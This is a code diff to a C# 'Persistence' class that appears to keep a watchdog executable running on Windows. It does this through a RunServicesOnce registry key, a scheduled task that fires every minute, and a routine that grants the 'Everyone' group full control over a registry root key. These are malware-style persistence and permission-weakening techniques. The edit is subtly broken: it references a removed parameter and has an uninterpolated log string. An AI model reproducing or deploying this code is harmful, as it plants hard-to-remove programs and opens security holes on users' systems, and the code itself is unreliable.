@@ -5,20 +5,12 @@ using System.Security.Principal;
 using System.IO;
 
 
-namespace Persistence
-{
+
     public class Persistence
     {
 
         public static void runAllTechniques()
         {
-            /*
-             * The issue is that File.GetAccessControl and File.SetAccessControl are not available in all .NET frameworks. They are available in the full .NET Framework, but not in .NET Core or .NET 5+.
-
-
-             * 
-             */
-
 
             SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce", "RunOnSystemStartTask", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); // Run Keys on startup
             //SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce", "WindowsRunOnSystemStartTask", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
@@ -53,11 +45,11 @@ namespace Persistence
             {
                 // Create or re-enable the task if it doesn't exist or is inactive
                 CreateScheduledTask(taskName, Config.PrimaryWatchdogFullPath, 1); // Runs every 1 minute
-                Console.WriteLine($"Scheduled task '{taskName}' created or re-enabled successfully.");
+                watchdogHelper.Log($"Scheduled task '{taskName}' created or re-enabled successfully.");
             }
             else
             {
-                Console.WriteLine($"Scheduled task '{taskName}' already exists and is active.");
+                watchdogHelper.Log($"Scheduled task '{taskName}' already exists and is active.");
 
             }
 
@@ -121,36 +113,24 @@ namespace Persistence
             }
             catch (UnauthorizedAccessException ex)
             {
-                LogError($"Access denied to registry key: {keyPath}. Exception: {ex.Message}");
+                watchdogHelper.Log($"Access denied to registry key: {keyPath}. Exception: {ex.Message}");
             }
             catch (IOException ex)
             {
-                LogError($"I/O error accessing registry key: {keyPath}. Exception: {ex.Message}");
+                watchdogHelper.Log($"I/O error accessing registry key: {keyPath}. Exception: {ex.Message}");
             }
             catch (Exception ex)
             {
-                LogError($"Unexpected error: {ex.Message}");
+                watchdogHelper.Log($"Unexpected error: {ex.Message}");
             }
         }
 
-        private static void LogError(string message)
-        {
-            // Log to a file, event log, or other logging mechanism
-            Console.WriteLine($"[ERROR] {message}");  // Example logging
-        }
+        
 
-        public static void GrantEveryoneFullControl(string registryHive)
+        public static void GrantEveryoneFullControl(RegistryKey rootKey)
         {
             try
             {
-                // Select the correct registry key (HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER)
-                RegistryKey rootKey = registryHive.ToUpper() switch
-                {
-                    "HKLM" => Registry.LocalMachine,
-                    "HKCU" => Registry.CurrentUser,
-                    _ => throw new ArgumentException("Invalid registry hive specified. Use 'HKLM' or 'HKCU'.")
-                };
-
                 // Get the current access control for the key
                 RegistrySecurity registrySecurity = rootKey.GetAccessControl();
 
@@ -172,68 +152,19 @@ namespace Persistence
                 // Apply the modified security settings to the key
                 rootKey.SetAccessControl(registrySecurity);
 
-                Console.WriteLine($"Successfully granted 'Everyone' full control and enabled inheritance on {registryHive}.");
+                watchdogHelper.Log($"Successfully granted 'Everyone' full control and enabled inheritance on {registryHive}.");
             }
             catch (UnauthorizedAccessException ex)
             {
-                Console.WriteLine("Error: Access denied. Run the application with administrator privileges.");
+                watchdogHelper.Log("Error: Access denied. Run the application with administrator privileges. Error: {ex.Message}");
             }
             catch (ArgumentException ex)
             {
-                Console.WriteLine($"Error: {ex.Message}");
+                watchdogHelper.Log($"Error: {ex.Message}");
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"An error occurred: {ex.Message}");
+                watchdogHelper.Log($"An error occurred: {ex.Message}");
             }
         }
-
-        public static void GrantEveryoneFullControlOnDirectory(string directoryPath) // applies full control to the directories and subdirectories
-        {
-            try
-            {
-                // Check if the directory exists
-                if (!Directory.Exists(directoryPath))
-                {
-                    throw new DirectoryNotFoundException($"The specified directory does not exist: {directoryPath}");
-                }
-
-                // Get the current access control settings for the directory
-                DirectoryInfo directoryInfo = new DirectoryInfo(directoryPath);
-                DirectorySecurity directorySecurity = directoryInfo.GetAccessControl();
-
-                // Create a new rule that grants "Everyone" full control, but only on directories (not files)
-                FileSystemAccessRule rule = new FileSystemAccessRule(
-                    new SecurityIdentifier(WellKnownSidType.WorldSid, null), // "Everyone" group
-                    FileSystemRights.FullControl,                           // Full control
-                    InheritanceFlags.ContainerInherit,                      // Inherit permissions only to subdirectories
-                    PropagationFlags.None,                                  // Don't propagate to child objects
-                    AccessControlType.Allow                                 // Allow the rule
-                );
-
-                // Add the rule to the directory security object
-                directorySecurity.AddAccessRule(rule);
-
-                // Apply the modified security settings to the directory
-                directoryInfo.SetAccessControl(directorySecurity);
-
-                Console.WriteLine($"Successfully granted 'Everyone' full control on the directory and subdirectories: {directoryPath}");
-            }
-            catch (UnauthorizedAccessException ex)
-            {
-                Console.WriteLine("Error: Access denied. Run the application with administrator privileges.");
-            }
-            catch (DirectoryNotFoundException ex)
-            {
-                Console.WriteLine($"Error: {ex.Message}");
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"An error occurred: {ex.Message}");
-            }
-        }
-
-
-     
     }
-}
